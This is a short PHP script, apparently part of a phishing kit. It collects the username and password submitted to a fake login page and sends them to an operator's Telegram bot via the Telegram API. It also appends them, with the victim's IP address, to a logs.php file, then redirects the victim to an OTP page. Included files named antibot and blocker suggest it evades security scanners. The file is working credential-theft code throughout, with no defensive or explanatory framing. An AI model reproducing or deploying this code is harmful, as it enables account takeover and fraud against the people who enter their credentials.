<?php 
error_reporting(0);
session_start();
include("../config/antibot.php");
include("../config/antibots.php");
include("../config/antibotsulit.php");
include("../config/blocker.php");
include("../config/bt.php");
include("../config/function.php");
include("../settings/config.php");
$username = ($_POST['username']);
$password = ($_POST['password']);
$time1 = date('M d - h:i:s A');
$mesg = "[$ip2] - LOGIN - [$time1]\nUser ID: $username\nPassword: $password\r\n==========================\n";
antibot($mesg);
$request_params = [
    'chat_id' => $user_id,
    'text' => $mesg
];
$request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
file_get_contents($request_url);

$seen = "<font color='#FF00FF' style='font-style:courier;' size='2'>| USERNAME : ".$username."  |  PASSWORD : ".$password."  |  IP ADDRESS : ".$ip2."</font><br>";
$flogs = fopen("../lib/logs.php","a");
fwrite($flogs, $seen);
fclose($flogs);


header("location: ../otp1.php");
?>